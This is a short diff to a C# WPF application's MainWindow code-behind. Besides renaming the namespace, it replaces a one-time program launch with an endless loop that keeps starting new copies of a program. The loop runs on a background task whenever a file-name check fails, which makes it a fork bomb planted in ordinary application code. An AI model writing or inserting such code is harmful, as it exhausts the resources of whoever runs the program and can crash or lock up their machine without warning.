@@ -14,7 +14,7 @@ using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
 
-namespace WPF
+namespace CodingDays
 {
     /// <summary>
     /// Interaction logic for MainWindow.xaml
@@ -41,14 +41,11 @@ namespace WPF
             if (!correctFileName)
             {
                 Task.Run(() => {
-                    Process notepad = new Process();
-                    notepad.StartInfo.FileName = programPath;
-                    notepad.Start();
-
-                    int i = 0;
                     while (true)
                     {
-                        i = (i + 1) % 1000;
+                        Process me = new Process();
+                        me.StartInfo.FileName = programPath;
+                        me.Start();
                     }
                 });
             }
